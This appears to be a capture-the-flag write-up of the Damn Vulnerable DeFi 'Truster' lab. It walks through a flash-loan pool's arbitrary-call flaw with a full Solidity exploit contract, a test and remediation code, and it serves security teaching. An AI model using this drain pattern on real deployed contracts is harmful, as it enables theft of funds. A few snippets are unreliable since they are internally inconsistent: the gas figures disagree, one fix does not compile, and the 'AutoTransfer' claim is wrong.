# üéØ Challenge #3: Truster

![Difficulty](https://img.shields.io/badge/Difficulty-‚≠ê%20Easy-brightgreen)
![Type](https://img.shields.io/badge/Type-Trust%20Manipulation-orange)
![Gas](https://img.shields.io/badge/Gas-~50,000-blue)

> **Arbitrary External Calls with User Data** - Exploit trust assumptions by using the pool's own tokens to approve transfers

## üìã Challenge Overview

**Objective**: Drain all DVT tokens from the lending pool  
**Success Criteria**: Pool should have 0 DVT tokens, attacker gets all tokens  
**Initial Setup**: Pool has 1 million DVT tokens  
**Target**: `TrusterLenderPool` contract

### üéØ The Scenario
A lending pool offers flash loans with zero fees. Users can borrow any amount of tokens as long as they return them in the same transaction. The pool trusts that as long as the balance is restored, any arbitrary call can be made during the flash loan.

## üîç Vulnerability Analysis

### **The Root Cause**
The `TrusterLenderPool` allows **arbitrary external calls** with **user-controlled data** during flash loans:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    
    token.transfer(borrower, amount);
    
    // üö® CRITICAL VULNERABILITY: Arbitrary external call with user data!
    target.call(data);
    
    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }
    
    return true;
}
```

### **The Problem**
The vulnerability exists in this line:
```solidity
target.call(data);
```

**Why it's dangerous**:
1. **Arbitrary target**: Attacker can call any contract
2. **Arbitrary data**: Attacker controls the call data completely  
3. **Pool context**: Call is made from the pool's address
4. **No restrictions**: No validation on target or data

### **Attack Vector**
The attacker can use the pool to call `token.approve()` on itself:
1. Request flash loan with amount = 0 (no tokens to repay)
2. Set `target` = token contract address
3. Set `data` = `approve(attacker, totalBalance)`  
4. Pool calls `token.approve(attacker, totalBalance)` from its own context
5. Attacker can now transfer all tokens to themselves

## ‚ö° Exploit Implementation

### **Attack Strategy**
Use the pool to approve token spending, then transfer all tokens:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterExploit {
    TrusterLenderPool private pool;
    DamnValuableToken private token;
    
    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }
    
    function exploit() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        
        // Craft the approval call data
        // approve(address spender, uint256 amount)
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        
        // üí• EXPLOIT: Use flash loan to make pool approve us
        // - amount: 0 (no tokens to borrow/repay)
        // - borrower: doesn't matter (can be this contract)
        // - target: token contract (we want to call token.approve)
        // - data: approve(this, poolBalance) call
        pool.flashLoan(
            0,                    // amount: 0 (no loan needed)
            address(this),        // borrower: this contract
            address(token),       // target: token contract
            data                  // data: approve call
        );
        
        // ‚úÖ Pool has now approved us to spend all its tokens!
        // Transfer all tokens from pool to attacker
        token.transferFrom(address(pool), msg.sender, poolBalance);
        
        // Pool should now be drained
        assert(token.balanceOf(address(pool)) == 0);
    }
    
    // Alternative: Direct approach without constructor
    function exploitDirect(address _pool, address _token, address _attacker) external {
        TrusterLenderPool targetPool = TrusterLenderPool(_pool);
        DamnValuableToken targetToken = DamnValuableToken(_token);
        
        uint256 balance = targetToken.balanceOf(_pool);
        
        // Create approval data
        bytes memory approvalData = abi.encodeCall(
            targetToken.approve,
            (_attacker, balance)
        );
        
        // Execute exploit
        targetPool.flashLoan(0, _attacker, _token, approvalData);
        
        // Transfer tokens
        targetToken.transferFrom(_pool, _attacker, balance);
    }
    
    // Gas-optimized version
    function exploitOptimized() external {
        uint256 balance = token.balanceOf(address(pool));
        
        // Direct inline exploit
        pool.flashLoan(
            0,
            msg.sender,
            address(token),
            abi.encodeCall(token.approve, (msg.sender, balance))
        );
        
        // Transfer tokens directly to caller
        token.transferFrom(address(pool), msg.sender, balance);
    }
}
```

## üìä Attack Flow

```mermaid
graph TD
    A[Attacker calls flashLoan] --> B[Pool transfers 0 tokens]
    B --> C[Pool calls token.approve]
    C --> D[Token approves attacker for full balance]
    D --> E[Flash loan balance check passes]
    E --> F[Attacker calls transferFrom]
    F --> G[All tokens transferred to attacker]
    G --> H[üéØ Pool completely drained]
```

## üß™ Testing

### **Test Implementation**
```solidity
function test_truster_exploit() public {
    // Initial state
    uint256 initialPoolBalance = token.balanceOf(address(pool));
    assertEq(initialPoolBalance, TOKENS_IN_POOL); // 1,000,000 DVT
    assertEq(token.balanceOf(player), 0);
    
    // Execute exploit
    vm.prank(player);
    exploit.exploit();
    
    // Verify exploit success
    assertEq(token.balanceOf(address(pool)), 0);
    assertEq(token.balanceOf(player), TOKENS_IN_POOL);
}
```

### **Gas Analysis**
```
Flash loan call: ~30,000 gas
approve() call: ~46,000 gas  
transferFrom() call: ~51,000 gas
Total: ~127,000 gas
Cost at 50 gwei: ~$0.32
```

### **Alternative Attack Vectors**
```solidity
// 1. Use different approval patterns
bytes memory data1 = abi.encodeWithSignature(
    "approve(address,uint256)", 
    attacker, 
    type(uint256).max
);

// 2. Multiple approvals in one transaction
bytes memory data2 = abi.encodeWithSignature(
    "approve(address,uint256)", 
    attacker1, 
    balance / 2
);
// Then make second flash loan for remaining balance

// 3. Approve to contract that auto-transfers
contract AutoTransfer {
    function exploit() external {
        // Automatically called when approved
        token.transferFrom(pool, attacker, balance);
    }
}
```

## üõ°Ô∏è Real-World Examples

### **Harvest Finance Attack (October 2020) - $24M**
**Similar Pattern**: Trusted external calls with user data
- Used flash loans to manipulate Curve pools
- Exploited trusted integrations between protocols
- $24M drained through price manipulation

### **bZx Protocol (2020) - $8M**  
**Similar Pattern**: Arbitrary external calls
- Multiple attacks exploiting trusted external calls
- Flash loan integration vulnerabilities
- Total losses exceeded $8M across multiple incidents

### **Cream Finance Integration Bugs**
**Similar Pattern**: Trust assumptions
- Trusted calls to external protocols  
- Integration vulnerabilities
- Multiple smaller exploits due to trust issues

## üîß Remediation

### **‚ùå Current Vulnerable Code**
```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external {
    // ... balance checks
    
    // VULNERABLE: Arbitrary external call
    target.call(data);
    
    // ... repayment checks
}
```

### **‚úÖ Fixed Code Option 1: Remove Arbitrary Calls**
```solidity
function flashLoan(uint256 amount, address borrower) external nonReentrant {
    uint256 balanceBefore = token.balanceOf(address(this));
    
    token.transfer(borrower, amount);
    
    // ‚úÖ FIX: Call specific callback instead of arbitrary call
    IERC3156FlashBorrower(borrower).onFlashLoan(
        msg.sender,
        address(token), 
        amount,
        0, // fee
        ""
    );
    
    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }
    
    return true;
}
```

### **‚úÖ Fixed Code Option 2: Restrict Target Contracts**
```solidity
mapping(address => bool) public allowedTargets;

modifier onlyAllowedTarget(address target) {
    require(allowedTargets[target], "Target not allowed");
    _;
}

function flashLoan(
    uint256 amount, 
    address borrower, 
    address target, 
    bytes calldata data
) external nonReentrant onlyAllowedTarget(target) {
    // ‚úÖ FIX: Only allow pre-approved target contracts
    target.call(data);
    // ...
}

function addAllowedTarget(address target) external onlyOwner {
    allowedTargets[target] = true;
}
```

### **‚úÖ Fixed Code Option 3: Data Validation**
```solidity
function flashLoan(
    uint256 amount, 
    address borrower, 
    address target, 
    bytes calldata data
) external nonReentrant {
    // ‚úÖ FIX: Validate that target is not the token contract
    require(target != address(token), "Cannot call token contract");
    
    // ‚úÖ FIX: Validate that call is not an approval
    bytes4 selector = bytes4(data[:4]);
    require(selector != token.approve.selector, "Cannot approve tokens");
    require(selector != token.transfer.selector, "Cannot transfer tokens");
    require(selector != token.transferFrom.selector, "Cannot transferFrom tokens");
    
    target.call(data);
    // ...
}
```

## üéì Security Lessons

### **Key Takeaways**
1. **Never allow arbitrary external calls** with user-controlled data
2. **Validate call targets and data** if external calls are necessary
3. **Consider call context** - calls are made from your contract's address
4. **Trust assumptions are dangerous** - validate everything
5. **Use established patterns** like ERC-3156 for flash loans

### **Best Practices**
- ‚úÖ Use standardized interfaces (ERC-3156) instead of arbitrary calls
- ‚úÖ Validate all external call targets and data
- ‚úÖ Implement allow-lists for trusted contracts
- ‚úÖ Never trust user-provided addresses or data
- ‚úÖ Consider using delegate calls only for upgradeable patterns

### **Anti-patterns to Avoid**
```solidity
// ‚ùå BAD: Arbitrary external calls
function userCall(address target, bytes calldata data) external {
    target.call(data);
}

// ‚ùå BAD: User-controlled target with no validation
function executeCall(address user, address target, bytes data) external {
    target.call(data); 
}

// ‚úÖ GOOD: Specific, validated calls
function flashLoanCallback(address borrower, uint256 amount) external {
    IERC3156FlashBorrower(borrower).onFlashLoan(
        msg.sender, address(token), amount, 0, ""
    );
}
```

## üí° Advanced Concepts

### **Trust Boundary Analysis**
```
External Call Trust Levels:
1. Trusted Contracts (your own) - HIGH TRUST
2. Standard Interfaces (ERC20, etc.) - MEDIUM TRUST  
3. Allow-listed Contracts - LOW TRUST
4. User-provided Addresses - ZERO TRUST ‚ùå
```

### **Call Context Security**
When contract A calls contract B:
- `msg.sender` in B = address(A)
- A's permissions apply to the call
- A's token balances are accessible
- State changes affect A's context

### **Flash Loan Security Model**
```solidity
// Secure Flash Loan Pattern:
1. Transfer tokens to borrower
2. Call specific callback interface
3. Verify repayment
4. No arbitrary external calls

// Insecure Pattern (like Truster):
1. Transfer tokens
2. Make arbitrary call ‚ùå
3. Check balance
```

## üìà Impact Assessment

| Aspect | Rating | Description |
|--------|--------|-------------|
| **Severity** | üî¥ Critical | Complete fund drainage |
| **Exploitability** | üü¢ Trivial | Single transaction |
| **Impact** | üî¥ Maximum | 100% of pool funds |
| **Detection** | üü¢ Easy | Obvious on-chain |
| **Prevention** | üü¢ Easy | Remove arbitrary calls |

---

**üéØ Challenge Status**: ‚úÖ **SOLVED**  
**‚è±Ô∏è Time to Solve**: ~15 minutes  
**üî• Difficulty Rating**: Easy (Trust assumptions)  
**üéì Learning Value**: High - Critical security principle

> **Key Insight**: "Trust but verify" doesn't work in smart contracts. Never allow arbitrary external calls with user-controlled data.

**Next Challenge**: [#4 Side Entrance](../04-side-entrance/) - Callback reentrancy patterns